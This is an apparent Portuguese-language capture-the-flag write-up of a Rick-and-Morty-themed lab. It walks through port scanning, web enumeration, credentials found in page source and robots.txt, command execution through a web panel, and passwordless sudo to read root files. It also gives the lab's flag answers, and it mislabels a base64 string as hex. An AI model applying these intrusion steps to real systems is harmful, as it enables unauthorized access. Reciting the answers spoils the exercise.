# Etapa única
## Escaneando as portas da máquina
Comecei escaneando a máquina para descobrir quais são as portas que estão abertas. Com isso, descobri as seguintes portas:

```
┌──(root💀Asgard)-[/home/ellie/Desktop]
└─# nmap 10.10.191.182 -sV -O
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-31 16:56 -03
Nmap scan report for 10.10.191.182
Host is up (0.28s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=1/31%OT=22%CT=1%CU=30854%PV=Y%DS=2%DC=I%G=Y%TM=61F83F2
OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M506ST11NW7%O2=M506ST11NW7%O3=M506NNT11NW7%O4=M506ST11NW7%O5=M506ST1
OS:1NW7%O6=M506ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M506NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.55 seconds
```

Ou seja, a porta ssh e a porta http.

## Analisando a porta http (80)

Ao ver que a porta está aberta, isso significa que há um servidor rodando na máquina. Podemos ver isso quando vamos ao navegador e pesquisamos pelo ip.

Analisando a página, eu descobri que inspecionando os elementos dela, o rick fez uma anotação sobre o usuário dele. A anotação dizia o seguinte:

```
    Note to self, remember username!
    Username: R1ckRul3s
```

Após isso, realizei a análise por meio das ferramentas nikto e dirb. O seguinte resultado foi visto:

```
┌──(ellie㉿Asgard)-[~]
└─$ dirb http://10.10.206.27                                                                    148 ⨯ 1 ⚙

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Jan 31 18:03:05 2022
URL_BASE: http://10.10.206.27/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.206.27/ ----
==> DIRECTORY: http://10.10.206.27/assets/                                                               
+ http://10.10.206.27/index.html (CODE:200|SIZE:1062)                                                    
+ http://10.10.206.27/robots.txt (CODE:200|SIZE:17)                                                      
                                                                                                         
(!) FATAL: Too many errors connecting to host
    (Possible cause: OPERATION TIMEOUT)
                                                                               
-----------------
END_TIME: Mon Jan 31 18:21:18 2022
DOWNLOADED: 3581 - FOUND: 2
```

```
┌──(ellie㉿Asgard)-[~]
└─$ nikto -h 10.10.206.27                                                                       148 ⨯ 1 ⚙
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.206.27
+ Target Hostname:    10.10.206.27
+ Target Port:        80
+ Start Time:         2022-01-31 18:01:34 (GMT-3)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 426, size: 5818ccf125686, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ Cookie PHPSESSID created without the httponly flag
+ OSVDB-3233: /icons/README: Apache default file found.
+ ERROR: Error limit (20) reached for host, giving up. Last error: opening stream: can't connect (timeout): Operation now in progress
+ Scan terminated:  20 error(s) and 8 item(s) reported on remote host
+ End Time:           2022-01-31 18:25:29 (GMT-3) (1435 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Verifiquei o link do robots.txt, vi que havia algo escrito:

```
Wubbalubbadubdub
```

Ao visitar a página (essa eu encontrei por conta de uma resolução de outra pessoa que resultou da execução do nikto). Coloquei a senha e o usuário e entrei no computador. Naquela página, eu inspecionei o elemento e vi o seguinte comentário na página:

```
Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0== 
```

Quando vi essa string, a primeira coisa que pensei foi que era uma string de base hexadecimal, pois o Breno me alertou que quando é assim, é muito frequente que termine com X ou com duas letras iguais. Quando usei o cyberchef para isso, vi as saídas:

```
CERTIFICATE
```

```
-----BEGIN CERTIFICATE-----
AAAAAAAAAADaAKAAABABAAAAAADUAAAAAAAAAAAKAAAAALAAAAAdCvAAAOAAAAAA
AAAAAAyxAAAAAAAAAAAAAAAKAAAAAAAAAKAADeAAAMAOOGABQVIFlGAjAAAAALAA
AAAAAAAAAAAAAAAAAAMpAAgSIpNoAAAACrAAAAAAAAAKAAAOAAAMAOVEAIR4iAdE
BzAAAAALAAAAAAAAAAAAAAAAAAAASSAAJFQBUTAEAAurAAAAAAAAAAAAAAAAAAAA
AAAVgVdWVnMFAFAAurAAAAAAAAAAAAAAAAAAAAAABRKYEZaFInAAAACrAAAAAAAA
AKAAAPAAAMAOYCAHIoM3aFBTAAAAALAAAAAAAAAAAAAAAAAAAAEgAAIDAYB4ADAA
urAAAAAAAAAAAAAAAAAAAAAABwFxVFJThFAAAACrAAAAAAAAAKAAAAAAAMAOZIAC
IIghVIABAAAAALAAAAAAAAAAAAAAAAAAAASZAAAXN3BAAHAAurAAAAAAAAAAAAAA
AAAAAAAAAyUjQgQEkpAAAACrAAAAAAAAAKAAAAAAAMAOZkAJNlWSBXARAAAAALAA
AAAAAAAAAAAAAAAAAAhGAAUjkHUEAIAAurAAAAAAAAAAAAAAAAAAAAAAB1B2FZAW
iSAAAACrAAAAAAAAAKAADaAAAMAOaQAESCRyMCCCAAAAALAAAAAAAAAAAAAAAAAA
AAlDAAYYZgiUAAAACrAAAAAAAAAKAAAOAAAMAOaZABRBUGZzCRAAAAALAAAAAAAA
AAAAAAAAAAAAMHAAgXYDcWBFAAAAALAAAAAAAAAAAAANAAAAAAMzAASSJUGBCFAA
AAALAAAAAAAAAAAAAAAAAAAANFAAEpcSIpACAAurAAAAAAAAAAAAAAAAAAAAAACR
dgeWKTljAAAACrAAAAAAAAAKAAAAAAAMAOiGAABVdohHAZAAAAALAAAAAAAAAAAA
AAAAAAAAdlAAg1MYmDAIAAurAAAAAAAAAAAAAAAAAAAAAARjAAACeJN4AEAAurAA
AAAAAAAAAAAAAAAAAAAAURAAiIk3loAGAAurAAAAAAAAAAAAAAAAAAAAAAc3AABm
gBiIAAAACrAAAAAAAAAKAAAAAAAMAOMEA4OFYQk0ZTAAAACrAAAAAAAAAKAAAAAA
AMAOM3AUhwEgAmBnAAAAALAAAAAAAAAAAAAAAAAAAAU4AIN1UiYJAJAAurAAAAAA
AAAAAAAAAAAAAAAAV1AAZlRCA5AAAACrAAAAAAAAAKAAALAAAMAOV4BoCXZ0AIAl
AAAAALAAAAAAAAAAAAAAAAAAAAkYACYDEklSACAAurAAAAAAAAAAAAAAAAAAAAAA
JSAAcwmAY5AEAAurAAAAAAAAAAAAAAAAAAAAAAM4AAk0YpNCAAAACrAAAAAAAAAK
AAAAAAAMAOlIB1YZEVNnCVAAAAALAAAAAAAAAAAAAKAAAAAABEBDOBmBiHBCAAAA
ALAAAAAAAAAAAAAAAAAAAAQUAjJnKZCGAGAAAAALAAAAAAAAAAAAAAAAAAAAeBBg
JRghNwAFAAurAAAAAAAAAPAOAAAAAAAAAAAIAAAOAOAAAAAFNhUFJgY4BTAAAAAA
AAAAAAAAAPAAAKAOAAAMAAAAAAAAA===
-----END CERTIFICATE-----
```

Quando fui testar CERTIFICATE no site, o seguinte resultado foi visto:

![[Pasted image 20220202130711.png]]

Aparentemente, estava indo pelo caminho errado. Como não tinha muita experiência, decidi olhar resoluções e vi que em alguns sistemas é possível listar os itens, por isso, testei o comando a seguir:

```
ls -al
```

que me retornou o seguinte resultado:

```
total 40
drwxr-xr-x 3 root   root   4096 Feb 10  2019 .
drwxr-xr-x 3 root   root   4096 Feb 10  2019 ..
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt
drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 10  2019 assets
-rwxr-xr-x 1 ubuntu ubuntu   54 Feb 10  2019 clue.txt
-rwxr-xr-x 1 ubuntu ubuntu 1105 Feb 10  2019 denied.php
-rwxrwxrwx 1 ubuntu ubuntu 1062 Feb 10  2019 index.html
-rwxr-xr-x 1 ubuntu ubuntu 1438 Feb 10  2019 login.php
-rwxr-xr-x 1 ubuntu ubuntu 2044 Feb 10  2019 portal.php
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 robots.txt
```

## Encontrando o primeiro ingrediente

Com essas páginas, comecei a analisa-las para ver se encontrava um ou mais ingredientes. A primeira foi Sup3rS3cretPickl3Ingred.txt que me retornou:

```
mr. meeseek hair
```

Este é o primeiro ingrediente.

## Encontrando o segundo ingrediente

Olhando para o clue.txt, ele me deu uma dica:

```
Look around the file system for the other ingredient.
```

Olhando pelo sistema, achei as seguintes pastas:

```
ls -al cd ../..
```

```
total 56
drwxr-xr-x 14 root root   4096 Feb 10  2019 .
drwxr-xr-x 23 root root   4096 Feb  2 20:37 ..
drwxr-xr-x  2 root root   4096 Feb  2 20:37 backups
drwxr-xr-x 10 root root   4096 Feb 10  2019 cache
drwxrwxrwt  2 root root   4096 Nov 14  2018 crash
drwxr-xr-x 43 root root   4096 Feb 10  2019 lib
drwxrwsr-x  2 root staff  4096 Apr 12  2016 local
lrwxrwxrwx  1 root root      9 Nov 14  2018 lock -> /run/lock
drwxrwxr-x  9 root syslog 4096 Feb 10  2019 log
drwxrwsr-x  2 root mail   4096 Nov 14  2018 mail
drwxr-xr-x  2 root root   4096 Nov 14  2018 opt
lrwxrwxrwx  1 root root      4 Nov 14  2018 run -> /run
drwxr-xr-x  4 root root   4096 Feb 10  2019 snap
drwxr-xr-x  4 root root   4096 Nov 14  2018 spool
drwxrwxrwt  4 root root   4096 Feb  2 20:37 tmp
drwxr-xr-x  3 root root   4096 Feb 10  2019 www
```

naveguei até encontrar um arquivo conhecido como 'second ingredients.txt' e usei o comando less para ler o arquivo

```
less ../../../home/rick/'second ingredients'
```

Assim, me deu a seguinte saída:

```
1 jerry tear
```

## Terceiro ingrediente

Esse eu precisei de ajuda do manual para saber como seguir.

primeiramente eu verifiquei as minhas permissões, utilizando o

```
sudo -l
```

```
Matching Defaults entries for www-data on ip-10-10-226-156.eu-west-1.compute.internal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-10-226-156.eu-west-1.compute.internal:
    (ALL) NOPASSWD: ALL
```

Com isso, eu vi que eu poderia acessar a pasta do usuário root e assim o fiz

```
sudo ls /root
```

```
3rd.txt
snap
```

Com isso, verifiquei primeiro o arquivo snap para ver se havia mais alguma coisa.

Não havia nada que precisasse para esse exercício, por isso eu utilizei o comando less novamente para abrir o arquivo .txt e ali estava a o terceiro ingrediente.

```
sudo less /root/3rd.txt
```

```
3rd ingredients: fleeb juice
```

